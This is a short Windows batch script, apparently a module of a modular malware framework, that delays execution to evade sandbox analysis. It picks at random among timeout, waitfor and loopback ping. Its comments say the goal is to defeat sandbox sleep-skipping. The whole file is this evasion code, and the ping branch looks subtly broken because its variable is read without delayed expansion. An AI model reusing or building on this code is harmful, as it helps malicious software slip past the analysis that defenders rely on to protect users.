REM provides: evasion_sleep_variation
REM depends: (none)
REM description: Randomized sleep using different methods to evade sandbox fast-forward

REM Select random sleep method to defeat sandbox sleep-skipping
set /a "METHOD=%RANDOM% %% 3"
if not defined SLEEP_SECONDS set "SLEEP_SECONDS=30"

if %METHOD%==0 (
    REM Method 1: timeout command
    timeout /t %SLEEP_SECONDS% /nobreak >nul 2>nul
)
if %METHOD%==1 (
    REM Method 2: waitfor with timeout (always times out = guaranteed delay)
    waitfor /t %SLEEP_SECONDS% SleepSig%RANDOM% >nul 2>nul
)
if %METHOD%==2 (
    REM Method 3: ping loopback (N+1 pings = N second delay)
    set /a "PINGS=%SLEEP_SECONDS% + 1"
    ping -n %PINGS% 127.0.0.1 >nul 2>nul
)
